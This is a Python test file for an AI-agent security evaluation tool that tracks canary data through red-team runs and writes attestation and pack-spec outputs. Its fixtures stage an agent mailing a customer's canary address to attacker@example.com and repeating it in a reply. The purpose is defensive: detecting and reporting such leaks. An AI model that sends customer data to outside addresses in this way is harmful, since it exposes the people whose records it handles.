"""GRC attestation, canary data-flow, and the open pack spec — not a model card."""

import json

from aisec import cli
from aisec.attestation import ATTESTATION_TYPE, write_attestation
from aisec.evidence import RunStore, manifest_digest, verify_manifest
from aisec.flow import flow_pack, render_flow_markdown
from aisec.packspec import check_pack, layout
from aisec.verdicts import EXIT_FAILED, EXIT_OK
from test_report import TARGET
from test_unique_product import _attack

MARKER = "1420 Larkspur Ln"


def _pack(tmp_path, run_id, *, events=None, sink=None, transcripts=None, canaries=None, results=None):
    scenario_file = tmp_path / f"{run_id}.yaml"
    scenario_file.write_text("id: s\n", encoding="utf-8")
    store = RunStore(tmp_path / "runs", run_id=run_id)
    store.create()
    store.write_json(
        "target.json",
        {
            **TARGET,
            "run_id": run_id,
            "canaries": canaries or {"customer:C-1001": [MARKER, "+1-202-555-0173"]},
            "parent_manifest_sha256": "p" * 64,
        },
    )
    store.add_scenario(scenario_file, "s")
    store.write_json(
        "verdict.json",
        {"run_id": run_id, "results": results or [_attack("refund", "RESISTED", "tools")], "summary": {"exit_code": 0}},
    )
    store.write_text("report.md", "# report\n")
    for event in events or []:
        store.append("events.jsonl", event)
    for entry in sink or []:
        store.append("sink.jsonl", entry)
    for entry in transcripts or []:
        store.append("transcripts.jsonl", entry)
    store.seal()
    return store.root


def test_flow_records_where_a_canary_moved_without_echoing_it(tmp_path):
    run_dir = _pack(
        tmp_path,
        "flow-me",
        events=[
            {
                "kind": "call",
                "server": "support_desk",
                "tool": "send_email",
                "arguments": {"to": "attacker@example.com", "body": f"Ship to {MARKER}"},
                "outcome": "ok",
                "scenario": "s",
                "arm": "trial",
            },
            {
                "kind": "call",
                "server": "support_desk",
                "tool": "issue_refund",
                "arguments": {"account": "ACC-9931", "note": MARKER},
                "outcome": "error",
                "scenario": "s",
                "arm": "trial",
            },
        ],
        sink=[{"action": "email_sent", "to": "attacker@example.com", "body": MARKER, "scenario": "s"}],
        transcripts=[{"event": "model_turn", "text": f"The address is {MARKER}", "scenario": "s"}],
    )
    flow = flow_pack(run_dir)
    vias = {m["via"] for m in flow["movements"]}
    assert vias == {"tool_args", "sink", "agent_reply"}
    assert flow["exfiltrated_canaries"] == ["customer:C-1001"]
    assert all(m["canary"] == "customer:C-1001" for m in flow["exfiltrated"])
    assert all(m["outcome"] != "error" or m["via"] != "tool_args" for m in flow["exfiltrated"])
    md = render_flow_markdown(flow)
    assert MARKER not in md
    assert "+1-202-555-0173" not in md
    assert cli.main(["flow", str(run_dir)]) == EXIT_FAILED


def test_attestation_is_untracked_grc_json_and_not_a_certification(tmp_path):
    run_dir = _pack(
        tmp_path,
        "attest-me",
        events=[
            {
                "kind": "call",
                "server": "support_desk",
                "tool": "send_email",
                "arguments": {"body": MARKER},
                "outcome": "ok",
                "scenario": "s",
            }
        ],
    )
    payload = write_attestation(run_dir)
    assert payload["type"] == ATTESTATION_TYPE
    assert payload["issuer"] == "New Chisel"
    assert payload["not_a_certification"] is True
    assert payload["not_issued_by_a_model_vendor"] is True
    assert payload["manifest_sha256"] == manifest_digest(run_dir)
    assert payload["parent_manifest_sha256"] == "p" * 64
    assert payload["canary_flow"]["exfiltrated"] == ["customer:C-1001"]
    assert MARKER not in json.dumps(payload)
    assert verify_manifest(run_dir)
    dest = tmp_path / "out" / "attestation.json"
    assert cli.main(["attest", str(run_dir), "--out", str(dest)]) == EXIT_OK
    copied = json.loads(dest.read_text(encoding="utf-8"))
    assert copied["type"] == ATTESTATION_TYPE


def test_spec_describes_the_open_layout_and_checks_a_pack(tmp_path, capsys):
    run_dir = _pack(tmp_path, "spec-me")
    spec = layout()
    assert "target.json" in spec["required"]
    assert "attestation.json" in spec["untracked_overlays"]
    assert "signature.json" in spec["untracked_overlays"]
    checked = check_pack(run_dir)
    assert checked["ok"] is True
    assert cli.main(["spec"]) == EXIT_OK
    printed = capsys.readouterr().out
    assert "attestation.json" in printed and "manifest.json" in printed
    assert cli.main(["spec", "--check", str(run_dir)]) == EXIT_OK
    assert "pack layout matches spec v1" in capsys.readouterr().out
